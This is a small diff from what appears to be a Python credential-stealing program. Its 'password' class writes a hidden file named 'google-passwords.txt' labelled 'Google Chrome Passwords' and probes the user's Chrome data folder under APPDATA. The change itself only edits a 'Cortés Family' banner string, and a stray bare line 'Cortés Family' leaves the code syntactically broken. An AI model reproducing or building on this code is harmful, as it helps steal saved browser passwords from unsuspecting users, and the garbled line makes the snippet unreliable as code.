@@ -275,7 +275,7 @@ class password():
 		self.roaming = os.getenv("appdata")
 
 		with open("google-passwords.txt", "w") as f:
-			f.write("CortésFamily /// Google Chrome Passwords\n\n")
+			f.write("Cortés Family /// Google Chrome Passwords\n\n")
 		hide(".\\google-passwords.txt")
 		Cortés Family
 		if os.path.exists(self.appdata+'\\Google'):
